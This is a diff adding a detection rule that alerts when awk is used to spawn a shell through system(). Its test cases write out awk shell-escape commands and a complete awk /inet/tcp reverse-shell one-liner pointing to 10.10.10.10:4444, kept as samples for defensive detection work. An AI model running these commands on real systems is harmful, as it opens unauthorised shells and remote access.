@@ -1,0 +1,28 @@
+name: rta_awk_system_shell
+mode: alert
+eval: |
+  (
+    e.process_name == "awk" &&
+    !re_match(e.process_args, "/inet/tcp/") &&
+    (
+      re_match(e.process_args, "BEGIN\\s*\\{\\s*system\\(") ||
+      re_match(e.process_args, "system\\(.*/(sh|bash)")
+    )
+  )
+tests:
+  - cleartext: "awk BEGIN system shell"
+    process_name: awk
+    process_args: "awk 'BEGIN {system(\"/bin/sh\")}'"
+    should_match: true
+  - cleartext: "awk system bash execution"
+    process_name: awk
+    process_args: "awk '{system(\"/bin/bash -c \\\"id\\\"\")}' file.txt"
+    should_match: true
+  - cleartext: "awk /inet/tcp reverse shell (covered by inet_tcp rule)"
+    process_name: awk
+    process_args: "awk 'BEGIN{s=\"/inet/tcp/0/10.10.10.10/4444\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!=\"exit\")close(s)}}'"
+    should_match: false
+  - cleartext: "normal awk text processing"
+    process_name: awk
+    process_args: "awk '{print $1}' data.txt"
+    should_match: false
